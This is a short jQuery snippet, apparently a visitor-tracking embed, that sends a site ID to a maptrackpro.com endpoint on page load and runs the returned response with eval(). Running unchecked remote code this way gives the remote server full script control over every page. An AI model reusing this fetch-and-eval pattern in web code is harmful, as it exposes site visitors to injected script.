jQuery(document).ready(function(){
        jQuery.ajax({url: "https://app.maptrackpro.com/mapkitchentrackcode.php",type: "POST", data : { siteid: 67236  }, success:          function(result){
         eval(result);
}});
});